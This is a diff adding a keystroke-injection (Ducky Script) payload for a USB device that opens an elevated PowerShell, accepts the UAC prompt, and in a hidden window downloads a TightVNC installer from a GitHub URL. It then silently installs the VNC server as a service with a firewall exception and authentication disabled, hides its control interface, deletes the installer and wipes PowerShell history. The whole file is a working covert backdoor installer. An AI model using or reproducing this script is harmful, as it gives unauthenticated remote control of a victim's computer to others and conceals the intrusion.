@@ -1,0 +1,32 @@
+DELAY 1000
+GUI r
+DELAY 1000
+REM Start elevated PowerShell
+STRING PowerShell Start-Process -Verb runAs PowerShell
+ENTER
+DELAY 5000
+ALT y
+ALT t
+DELAY 5000
+REM Shrink PowerShell window
+STRING mode con cols=20 lines=1
+ENTER
+REM Run payload in hidden PowerShell window
+STRING Start-Process -WindowStyle Hidden PowerShell "
+REM Payload
+STRING cd C:\Windows;
+STRING (New-Object System.Net.WebClient).DownloadFile('https://github.com/Gyanbu/MalduinoScripts/raw/master/Tvnc.msi','C:\Windows\Tvnc.msi');
+STRING msiexec.exe /i Tvnc.msi /quiet /norestart 
+STRING ADDLOCAL='Server' 
+STRING SERVER_REGISTER_AS_SERVICE=1 
+STRING SERVER_ADD_FIREWALL_EXCEPTION=1 
+STRING SERVER_ALLOW_SAS=1 
+STRING SET_USEVNCAUTHENTICATION=1 
+STRING VALUE_OF_USEVNCAUTHENTICATION=0 
+STRING SET_REMOVEWALLPAPER=1 
+STRING VALUE_OF_REMOVEWALLPAPER=0 
+STRING SET_RUNCONTROLINTERFACE=1
+STRING VALUE_OF_RUNCONTROLINTERFACE=0 | Out-Null;
+STRING Remove-Item Tvnc.msi
+STRING ";(Get-PSReadlineOption).HistorySavePath | rm;exit
+ENTER
